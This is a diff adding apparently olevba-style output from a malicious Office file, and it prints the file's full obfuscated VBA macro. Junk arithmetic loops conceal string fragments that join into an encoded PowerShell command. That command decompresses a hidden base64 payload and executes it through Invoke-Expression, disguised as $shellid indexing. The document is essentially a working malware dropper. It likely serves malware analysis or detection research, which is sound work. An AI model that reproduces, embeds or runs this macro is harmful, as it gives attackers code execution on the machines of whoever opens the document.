@@ -1,0 +1,261 @@
+Filename     : ./macros/445582a457e1b968ccd7b86c0b74de0cf5ba58acbc42d9a81d69bcf0eed515dc
+OLE stream   : Macros/VBA/BVwzZCwRoiKC
+VBA filename : BVwzZCwRoiKC.bas
+----------------------------------------
+Attribute VB_Name = "BVwzZCwRoiKC"
+Function jXoNWXMJ()
+On Error Resume Next
+For qdObdw = waHmIj To mlotZC
+      For iOTHWf = wMzjV To 99189
+         pMaoFI = (72355 / CBool(LEzLb) - GdQdik / Oct(23315 / Hex(28187) / UGTPBO + Rnd(FnjOz / Fix(37))))
+Next
+   OETuH = 12010 - 5803
+Next
+VtjtBuSmi = "HeLL -e " + "KAAgAE4AZQB3AC" + "0AbwBi" + "AGoAZQBDAHQA" + "IAA" + "gAHMAeQBTAFQAR" + "QBN" + "AC4ASQBPAC" + "4A"
+For JKDnp = hDmOYa To Fhmtj
+      For CwJcN = iPLJod To 11312
+         jKvPb = (22764 / CBool(cCAUpX) - IXhBX / Oct(93323 / Hex(1500) / ziqIH + Rnd(VtwlS / Fix(37))))
+Next
+   lulWR = 46130 - 57799
+Next
+jnkpjNIq = "QwBPA" + "E0AcABSAGUA" + "cwBz" + "AEkAbw"
+For wJHXI = GocnGJ To PLNYT
+      For MGIBj = IUOlK To 68550
+         SaUqbS = (98504 / CBool(MhRLfJ) - VjYzz / Oct(37473 / Hex(33867) / nHXAA + Rnd(sDRDG / Fix(37))))
+Next
+   jvVlGU = 48949 - 99201
+Next
+ktMGDitfXiS = "BuA" + "C4ARA" + "BFAEYA" + "bAB" + "BAHQARQB" + "zAHQAUgBl" + "AEEATQAoAF" + "sAcwBZAH"
+For qqENE = iMMlfA To jjDSw
+      For UiAIY = UaOmr To 56485
+         StwQTm = (93530 / CBool(NqERa) - cPlioV / Oct(4178 / Hex(59673) / qifvjY + Rnd(ZUIli / Fix(37))))
+Next
+   jSkfB = 27041 - 13040
+Next
+iazwwu = "MA" + "VABFAG0ALg" + "BJAG8ALgBNAEUAT" + "QBPA" + "HIAe" + "QBzAF" + "QAUgBlAGEAbQ" + "Bd" + "ACAAW"
+For vqwcrK = EDHrmw To inrMk
+      For RkJoHO = TwIToY To 15503
+         rhSrNn = (40429 / CBool(BuvPd) - wnpdJW / Oct(21283 / Hex(64317) / VdfIG + Rnd(nDOqKr / Fix(37))))
+Next
+   YUXKw = 36210 - 15576
+Next
+jimWdN = "wBDAG8ATg" + "BWAEUAcgB0AF" + "0A" + "OgA6A" + "GYA" + "cgBvAG0AQg" + "BBAFMARQA2ADQ"
+For LwCkBU = KPlkKY To OiiOWN
+      For hYSsqP = FwZsZ To 28618
+         icYEa = (16696 / CBool(zEahha) - ofhwu / Oct(8028 / Hex(58118) / jsLFK + Rnd(QMskJ / Fix(37))))
+Next
+   jFGJvE = 95225 - 64558
+Next
+muwzo = "AcwB0A" + "FIAaQBuAGcAKAA" + "nA" + "FYAWgBCAGIAYQA" + "4AEoAQQBFAE" + "kAW" + "AAvAHkAagA0" + "AEUAbwByAFQAdQ"
+For sLIoN = TsviK To EtftUw
+      For jshwYm = jYXAp To 12803
+         FqhCQw = (77377 / CBool(TwGwIi) - bQaGJ / Oct(96914 / Hex(53709) / OkBqh + Rnd(UupEjz / Fix(37))))
+Next
+   wqEBz = 73872 - 47670
+Next
+kbMsO = "BlAG4AawBvA" + "E4A" + "UgBRAFUAYgA" + "wA" + "FYAcgBzAFUAUgB" + "RAG8AVgBBADIAb" + "QA5AEcAcwBKAH" + "IAdABoAE0" + "AegBGAEcAO"
+jXoNWXMJ = VtjtBuSmi + jnkpjNIq + ktMGDitfXiS + iazwwu + jimWdN + muwzo + kbMsO
+End Function
+Function BiwmJuhnZwj()
+On Error Resume Next
+For qZitXw = Zjwwd To SRPGGB
+      For BRuZiJ = ZWEKLD To 49554
+         LWzKw = (25538 / CBool(FHkVW) - ZpvskZ / Oct(68078 / Hex(48351) / FONThC + Rnd(mmaGtG / Fix(37))))
+Next
+   IwDljL = 76008 - 77590
+Next
+QSsrOF = "ABiA" + "DkAMwB4" + "AFEAd" + "gB0AHk" + "AOABEAE8AK" + "wBXAGIATwA3AEg" + "ASABpAGEAWA"
+For mzAhJ = bdqzj To jzifS
+      For UwvQmS = mwhnCN To 83032
+         FaWhV = (40366 / CBool(LzPua) - ZzYGOj / Oct(36418 / Hex(80474) / VLhlW + Rnd(tpnlp / Fix(37))))
+Next
+   dWIzzG = 99059 - 75557
+Next
+lLjuKzbVS = "BpAGMA" + "KwArAFMATg" + "BLAEMAaABxAE8" + "AdABpAEMAUQB" + "HAEsANABDAG4AW" + "ABpA" + "E8A" + "YwB2ACsAWQBqAHM" + "AZQAvAHQAZ"
+For BrsVNz = hoiYb To ELzjwA
+      For HcIkb = cQIRdT To 4924
+         UTpPJ = (45957 / CBool(HzHRYl) - wwNIz / Oct(41196 / Hex(82242) / jHuQU + Rnd(ZXBEYc / Fix(37))))
+Next
+   rKUoch = 99219 - 55670
+Next
+fbUzWwVBTJ = "gA4AE0Aa" + "wBOAEkANgBDAG" + "MAZwBYAFUA" + "RABRAGkA" + "eQBVAG8AOQB" + "CAHoAMABKADIA" + "dAB0AFEAVABkAEM" + "AVABOAHUATQBGAF" + "UA"
+For TDKLT = DUThY To khVsDs
+      For bGMzJh = nsTXn To 83023
+         iorGJY = (28868 / CBool(jkrDo) - czwYp / Oct(32263 / Hex(2204) / HDAdOW + Rnd(Bwthz / Fix(37))))
+Next
+   tiluT = 38101 - 16147
+Next
+UJTAAqMZPA = "VgBCAEUA" + "eQ" + "A2AFEAbAA" + "vAEoASQBGAFM" + "ARAB" + "yAHIAZ"
+For bHFtw = tWwwa To mhnGjK
+      For IiowWo = jVKiV To 94161
+         VfwvjQ = (21469 / CBool(fzuGE) - LqfOJ / Oct(51873 / Hex(201) / nIiFsb + Rnd(LUddC / Fix(37))))
+Next
+   BrLwt = 64764 - 82343
+Next
+dcUKNkfYlq = "AA1AFgASAB5A" + "DMAVw" + "ArAGEAT" + "wB" + "IAFgARwAzAE" + "MAWABH" + "AEIAZQBnA" + "HEASgBDAEoAd" + "wB" + "4ADUAR"
+For qDPkpY = fPLVsZ To nMiXks
+      For cRdCz = zURPt To 17857
+         wFTUDC = (88617 / CBool(FRHJrI) - wSWzz / Oct(60720 / Hex(26307) / misNfK + Rnd(wcjdwi / Fix(37))))
+Next
+   JUhwnX = 881 - 42462
+Next
+GTGPcwiDpo = "QB1AFYAcQB" + "3AD" + "EAcgBO" + "AGYAUgBuAFcASAA" + "yA" + "HgAbwBBAE" + "wA"
+For GBuVwt = LQiShm To oOVGV
+      For aOMWFJ = Qzspl To 30865
+         mMkpzC = (63431 / CBool(MNPLW) - skRQf / Oct(83332 / Hex(35116) / oYPpqf + Rnd(YtjRz / Fix(37))))
+Next
+   cdjHS = 95698 - 4345
+Next
+zYOPaXj = "SQBMAFEAQQBQ" + "AEQASgB" + "vADEANg" + "BzA" + "DUAZw"
+For zGtnt = OaYGY To uYMZK
+      For BLoUi = YkPGlJ To 24777
+         QqoRWB = (95829 / CBool(zzUas) - iERGzG / Oct(92515 / Hex(81640) / fYzOI + Rnd(IoPtf / Fix(37))))
+Next
+   DjuDI = 26836 - 89428
+Next
+jJwiTSiSwGI = "BO" + "AEgAaQBKAEcAZwB" + "EAEsAQg" + "BpAHcAZg" + "BOAE8A" + "UgB1AE" + "4ARg" + "B5ACsAagBoADcA"
+BiwmJuhnZwj = QSsrOF + lLjuKzbVS + fbUzWwVBTJ + UJTAAqMZPA + dcUKNkfYlq + GTGPcwiDpo + zYOPaXj + jJwiTSiSwGI
+End Function
+Function tSAXBiinn()
+On Error Resume Next
+For qAICw = LofLG To ZiJtXn
+      For woJEjN = bVWDp To 85968
+         bWfPw = (30893 / CBool(zTJEn) - hZZBjU / Oct(47349 / Hex(91824) / hvcpf + Rnd(qSbWNv / Fix(37))))
+Next
+   HiiaXm = 3346 - 40368
+Next
+GKVQAKGlaZ = "aQAz" + "AHQAKwBrAH" + "MAMQBJAE" + "kAbgBRAF" + "cANwBrAGYAVQBkA" + "DgANQBIAHYA" + "bQBVAGoAKwBO" + "AEo" + "AVgBi"
+For AsflCv = XUUFB To jmHkYG
+      For hhZlk = vXFzl To 88484
+         hvjJu = (54259 / CBool(zEBtpv) - urTmO / Oct(90194 / Hex(38274) / SStBk + Rnd(zRWiLz / Fix(37))))
+Next
+   nDzqv = 23151 - 6551
+Next
+PlHVMOJ = "AGMAa" + "gBsAHYAMQBuAEcA" + "Ng" + "BRADcAMwB"
+For jjvozB = mKXzlP To QPtrvA
+      For iLiwKG = VwSiQo To 73159
+         zMlwRf = (22900 / CBool(MMsKm) - wEQDrB / Oct(40982 / Hex(33996) / ousROE + Rnd(UbriS / Fix(37))))
+Next
+   GwiHSA = 33503 - 74115
+Next
+PDVFBhFUUBr = "wAGQ" + "AKw" + "B3AEgAbgBtA" + "G8AZgBkAGQ" + "AOABCAEsANAA1AG"
+For wBnzO = NwkQj To wDZNz
+      For wrRTH = QwUUk To 66574
+         ADWwq = (57589 / CBool(qwHiG) - lJJsJ / Oct(86832 / Hex(40911) / UvActX + Rnd(QztLBv / Fix(37))))
+Next
+   TZFiji = 30535 - 96650
+Next
+CvwBwT = "sA" + "MABHADYAKwB0AF" + "YA" + "cwBNAFMAWAAxA" + "EkAcwA"
+For mMudHo = KrNafI To VzGfa
+      For OSERF = jnbJmi To 43606
+         OQztb = (52610 / CBool(iUoVA) - DkldD / Oct(79963 / Hex(96103) / THcXR + Rnd(oiibw / Fix(37))))
+Next
+   zHEwM = 7651 - 97961
+Next
+jPzjSAalZb = "wAHcAcwBBAGE" + "AdAA" + "rADIAQwBh" + "AFQA" + "awBpAGIA" + "agBmAHIAcQ" + "AzADM" + "AW" + "QBmA" + "HUAbQBjAEE"
+tSAXBiinn = GKVQAKGlaZ + PlHVMOJ + PDVFBhFUUBr + CvwBwT + jPzjSAalZb
+End Function
+Function GMiFFDU()
+On Error Resume Next
+For fwQwFd = CqfioY To uIWVJW
+      For zmNYrN = fmRzqU To 82235
+         rjSnY = (71677 / CBool(CsIjJM) - bqucuf / Oct(23313 / Hex(5139) / NQkXD + Rnd(jwEzZ / Fix(37))))
+Next
+   pDVzz = 14779 - 68707
+Next
+DduSQSHP = "ARAB" + "YAFc" + "AM" + "gBzAEQAWABF" + "AFEAVgBSADgAc" + "ABpAG0AaABDAHAA" + "eQBEAF" + "cAZgA2AGcAbAB" + "OAGUAYgBxAGwAUw"
+For QIEjj = aFOZL To oIFXo
+      For ooIKf = mimnY To 60110
+         XchHFL = (2212 / CBool(soijim) - chzzI / Oct(67960 / Hex(36639) / MGctwE + Rnd(mjibn / Fix(37))))
+Next
+   HAAMna = 92334 - 103
+Next
+LmqEAmT = "B2AHUANg" + "BVA" + "EwASABt" + "ADQ" + "AVgBEAEcAYw"
+For aAYVCE = aWOEjU To cREiT
+      For zBCzk = jzlUJ To 44304
+         ijbUaC = (38950 / CBool(GMNizn) - Xvircw / Oct(62866 / Hex(47789) / ZlhYsp + Rnd(FhllU / Fix(37))))
+Next
+   wijzE = 82880 - 79084
+Next
+ktGpQrw = "BFAFAAcABYAFAA" + "dABvAHAATgBwAF" + "UAcQBzAC8Aa" + "wA2AGwAagAxAG" + "YATwBR" + "AEcAYQ" + "B6AE8" + "AagBCAFcAVABa" + "AHIAZQB" + "zAEYA"
+For Qkhjap = RuwBHd To pUvERK
+      For BOBfV = EKcupj To 16925
+         AzrRz = (30031 / CBool(nojNXB) - LDzZij / Oct(29335 / Hex(43363) / BEqiGR + Rnd(MXUlp / Fix(37))))
+Next
+   EnRuV = 26940 - 50013
+Next
+JMJMUlzkHd = "MQBtAEgAbgB" + "uAFEA" + "VgBIAEUA" + "WgAwAEsA" + "SQB4A" + "EYAcQBrA" + "GM" + "ANgBR" + "AE8ARAA5ADAA" + "YwBCAEM"
+GMiFFDU = DduSQSHP + LmqEAmT + ktGpQrw + JMJMUlzkHd
+End Function
+Function QMlAsO()
+On Error Resume Next
+For SzzPz = uPEcu To TqMIhj
+      For mXpDP = qzMIkL To 2402
+         PiGsTH = (85271 / CBool(wSsrL) - NaINo / Oct(86126 / Hex(76839) / duiPIa + Rnd(HUQtjE / Fix(37))))
+Next
+   FPOYc = 58526 - 52120
+Next
+rOISjocAbL = "AUQBvAH" + "QAUwBLAFQAdQAwA" + "EE" + "AM"
+For KYool = zXXIIV To MKDwS
+      For owbwi = FUtwPP To 18320
+         GkJbU = (77300 / CBool(IztkYi) - tFKaK / Oct(9788 / Hex(73545) / iZJqj + Rnd(FYHsz / Fix(37))))
+Next
+   wbAci = 57739 - 56182
+Next
+LzddkP = "wA0AEIAMwBQAH" + "YA" + "OABDACcAKQA" + "sAC" + "AA" + "WwBTAF"
+For AiNGPD = onpFEj To BkRiHi
+      For YlrZf = REhvj To 53606
+         WzMCb = (56430 / CBool(RkSnuW) - ZQLAW / Oct(97436 / Hex(56835) / wVhjzI + Rnd(GtYcaM / Fix(37))))
+Next
+   YOCin = 70876 - 77258
+Next
+nHUjUoXcwr = "kAUw" + "BUAEUA" + "bQA" + "uAEkATwAuAGMAb" + "wBtAFA" + "AUgBFAHMAU" + "wBJAE8AbgAuAGMA" + "bwBtAHAA" + "UgBFAFMAcwBJ"
+For EiJos = WvKdcu To qVrdh
+      For iYOSwD = swzrK To 85959
+         dRCaLQ = (94048 / CBool(wOzzRw) - tLAFDJ / Oct(91260 / Hex(80708) / NkUua + Rnd(SSjGaY / Fix(37))))
+Next
+   RSRkv = 49508 - 855
+Next
+zAtkzXj = "AE8ATgBNAG8AZA" + "BlAF0AO" + "gA6AEQ" + "ARQBDAE8AbQBQ" + "AFIAZQBTAFMA" + "IAApAHwAIABmAG8"
+QMlAsO = rOISjocAbL + LzddkP + nHUjUoXcwr + zAtkzXj
+End Function
+Function SpDwaBPlQ()
+On Error Resume Next
+For wlYLD = rEpihb To NawCIA
+      For hOKYIZ = ioSOVp To 88350
+         zvjXL = (51939 / CBool(ucszd) - sVimZ / Oct(8810 / Hex(72512) / aACdsJ + Rnd(XPLlv / Fix(37))))
+Next
+   bATloU = 37616 - 38470
+Next
+bAzDT = "AcgBlAEEA" + "YwBIAC0A" + "bwBiAEoARQBDA" + "HQAIAB7AE" + "4AZQB3AC0" + "AbwBiAGo" + "AZQBDAHQAIABzA" + "HkAUwB0AGUA" + "bQAuAGkATwA" + "uAFMA"
+For jLvpqT = cwkIiY To jtTRzW
+      For jMiFQ = OAkjS To 31189
+         TrhDTw = (75904 / CBool(PAnUCE) - rVDWzV / Oct(99326 / Hex(98094) / jZzVb + Rnd(BqOfb / Fix(37))))
+Next
+   LPwAjZ = 33044 - 21848
+Next
+OdwNtBcjzRP = "VAByAEUAQQBNAF" + "IARQBBAGQARQB" + "SACgAJABfAC" + "AA" + "LABbA" + "FQAZQB4AFQ" + "ALgB" + "FAG4AQwBPAEQA" + "SQ"
+For lOPbJP = vSXUsU To uzSMD
+      For zFXdwf = EVOvi To 76252
+         zLjtR = (93641 / CBool(uvIHz) - vEDRNN / Oct(22796 / Hex(94528) / qmfdJb + Rnd(EblEBW / Fix(37))))
+Next
+   OYuGiD = 19944 - 28925
+Next
+SRiunIq = "BOA" + "EcAXQA" + "6ADo" + "AYQBzAGMAa" + "QBpA" + "CAAKQAgAH0A" + "IAApAC4A" + "cgBlAEEAZ" + "AB0AG8ARQ" + "BOAEQAKAApAHwA"
+For znJAS = iUbVRU To OnntUq
+      For VtqZUo = SGhtVb To 32588
+         pzaHHs = (32329 / CBool(fFPRKG) - ljTiz / Oct(11070 / Hex(95405) / fdEPOu + Rnd(vsfizn / Fix(37))))
+Next
+   MjnFQ = 21000 - 38400
+Next
+zNWzwhd = "Jg" + "AoA" + "CAAJ" + "ABzAGg" + "AR" + "QBsAG" + "wASQBkAFs" + "AMQBdACsAJABz"
+For XhMmv = CtRas To vdCdC
+      For DJWlcI = TWkuup To 74411
+         ZGWDb = (98963 / CBool(twOHF) - XijKC / Oct(66878 / Hex(14219) / jlFDG + Rnd(oRwWlF / Fix(37))))
+Next
+   VXjZbi = 74164 - 31292
+Next
+DLHkjznBQ = "AGgARQBMA" + "EwAaQBEAF" + "sAMQAzAF0AKwAn" + "AFgAJw" + "ApAA=="
+SpDwaBPlQ = bAzDT + OdwNtBcjzRP + SRiunIq + zNWzwhd + DLHkjznBQ
+End Function
+
